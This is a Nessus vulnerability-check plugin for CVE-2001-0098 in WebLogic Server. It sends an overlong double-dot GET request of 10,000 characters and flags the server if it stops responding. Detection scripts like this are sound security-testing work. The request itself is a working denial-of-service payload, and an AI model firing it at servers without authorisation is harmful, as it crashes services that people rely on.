#%NASL_MIN_LEVEL 70300
#
# This script was written by Vincent Renardias <vincent@strongholdnet.com>
#
# Licence : GPL v2
#

# Changes by Tenable:
# - Revised plugin title (4/13/2009)
# - Added cpe, updated copyright (8/15/2012)
# - Switched to the weblogic detect script, updated copyright (11/23/2015)

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(10697);
  script_version("1.35");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2001-0098");
  script_bugtraq_id(2138);

  script_name(english:"WebLogic Server Double Dot GET Request Remote Overflow");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is vulnerable to a buffer overflow attack.");
  script_set_attribute(attribute:"description", value:
"Requesting an overly long URL starting with a double dot can crash
certain versions of WebLogic servers or possibly even allow for
arbitrary code execution.");
  script_set_attribute(attribute:"see_also", value:"https://seclists.org/bugtraq/2000/Dec/382");
  script_set_attribute(attribute:"solution", value:
"Upgrade to WebLogic 5.1 with Service Pack 7 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2000/12/19");
  script_set_attribute(attribute:"plugin_publication_date", value:"2001/06/21");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:oracle:weblogic_server");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_family(english:"Web Servers");

  script_copyright(english:"This script is Copyright (C) 2001-2022 StrongHoldNet");

  script_dependencies("weblogic_detect.nasl");
  script_require_keys("www/weblogic");
  script_require_ports("Services/www", 80, 7001);

  exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("misc_func.inc");

get_kb_item_or_exit("www/weblogic");
port = get_http_port(default:80, embedded:TRUE);
get_kb_item_or_exit("www/weblogic/" + port + "/installed");

banner = get_http_banner(port:port);
if (!banner || "WebLogic" >!< banner) exit(0);

if(get_port_state(port))
{
 if(http_is_dead(port:port))exit(0);
 soc = http_open_socket(port);
 if(soc)
 {
  buffer = http_get(item:string("..", crap(10000)), port:port);
  send(socket:soc, data:buffer);
  r = http_recv(socket:soc);
  http_close_socket(soc);
  
  if(http_is_dead(port:port, retry: 2))security_hole(port);
 }
}

